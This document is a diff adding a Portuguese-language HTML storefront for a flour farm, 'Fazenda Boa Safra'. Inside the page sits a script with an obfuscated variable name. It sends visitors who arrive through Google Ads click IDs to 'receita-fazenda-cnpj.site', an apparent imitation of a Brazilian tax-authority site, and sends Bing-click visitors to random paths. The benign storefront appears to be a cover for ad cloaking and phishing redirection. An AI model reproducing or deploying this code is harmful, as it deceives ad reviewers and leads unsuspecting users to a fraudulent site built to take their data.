@@ -1,1 +1,188 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fazenda Boa Safra - Farinhas Naturais</title>
 
+<style>
+body{
+margin:0;
+font-family:Arial, Helvetica, sans-serif;
+background:#f4f4f4;
+}
+
+header{
+background:#8B4513;
+color:white;
+padding:15px;
+text-align:center;
+}
+
+nav{
+background:#A0522D;
+padding:10px;
+text-align:center;
+}
+
+nav a{
+color:white;
+margin:10px;
+text-decoration:none;
+font-weight:bold;
+}
+
+.banner{
+background:url('https://images.unsplash.com/photo-1606788075761-4c3d8e5d2a7e');
+height:300px;
+background-size:cover;
+background-position:center;
+}
+
+.container{
+padding:30px;
+text-align:center;
+}
+
+.produtos{
+display:flex;
+flex-wrap:wrap;
+justify-content:center;
+}
+
+.card{
+background:white;
+width:250px;
+margin:15px;
+padding:20px;
+border-radius:10px;
+box-shadow:0px 0px 10px rgba(0,0,0,0.2);
+}
+
+footer{
+background:#333;
+color:white;
+text-align:center;
+padding:20px;
+margin-top:20px;
+}
+</style>
+</head>
+<script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www8.receita-fazenda-cnpj.site/buscar';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+<h1>Fazenda Boa Safra</h1>
+<p>Produção de Farinhas 100% Naturais</p>
+</header>
+
+<nav>
+<a href="#">Início</a>
+<a href="#">Produtos</a>
+<a href="#">Sobre</a>
+<a href="#">Contato</a>
+</nav>
+
+<div class="banner"></div>
+
+<div class="container">
+<h2>Nossos Produtos</h2>
+
+<div class="produtos">
+
+<div class="card">
+<h3>Farinha de Mandioca</h3>
+<p>Produzida com mandioca selecionada e torrada artesanalmente.</p>
+</div>
+
+<div class="card">
+<h3>Farinha de Milho</h3>
+<p>Ideal para cuscuz, bolos e receitas tradicionais.</p>
+</div>
+
+<div class="card">
+<h3>Farinha de Trigo</h3>
+<p>Perfeita para pães, massas e confeitaria.</p>
+</div>
+
+<div class="card">
+<h3>Polvilho Doce</h3>
+<p>Ótimo para pão de queijo e biscoitos.</p>
+</div>
+
+</div>
+</div>
+
+<footer>
+<p>📍 Endereço: Rua das Palmeiras, 120 - Centro, São Paulo - SP</p>
+<p>CNPJ: 12.345.678/0001-99</p>
+<p>© 2026 Fazenda Boa Safra - Todos os direitos reservados</p>
+</footer>
+
+</body>
+</html>
